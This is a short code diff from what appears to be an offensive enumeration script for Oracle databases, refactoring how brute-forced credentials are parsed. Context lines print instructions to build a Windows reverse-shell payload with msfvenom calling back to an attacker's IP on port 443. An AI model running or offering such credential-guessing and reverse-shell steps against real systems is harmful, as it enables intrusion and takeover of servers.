@@ -22,8 +22,8 @@ Enum_Oracle() {
                 cp $reconDir2/oracle-$sid-password-guesser.txt $reconDir2/Found-Oracle-$sid-Credentials.txt
                 grep -Ev "Time|ETA" $reconDir2/Found-Oracle-$sid-Credentials.txt >$reconDir2/oracle-Found-$sid-Credentials.txt
                 grep -A 1 "Accounts found" $reconDir2/oracle-Found-$sid-Credentials.txt | tail -n 1 >$reconDir2/oracle-$sid-user-pass.txt
-                username=$(cat $reconDir2/oracle-$sid-user-pass.txt | cut -d "/" -f 1)
-                password=$(cat $reconDir2/oracle-$sid-user-pass.txt | cut -d "/" -f 2)
+                username=$(cut -d "/" -f 1 $reconDir2/oracle-$sid-user-pass.txt)
+                password=$(cut -d "/" -f 2 $reconDir2/oracle-$sid-user-pass.txt)
                 echo -e "${NICE} ${YELLOW}You can now get a system shell using MSFVENOM & ODAT! ${END}"
                 echo -e "${NICE} ${YELLOW}Run the following commands ${END}"
                 echo -e "${NICE} ${YELLOW}msfvenom -p windows/x64/shell/reverse_tcp LHOST=YOUR-IP LPORT=443 -f exe -o reverse443.exe ${END}"
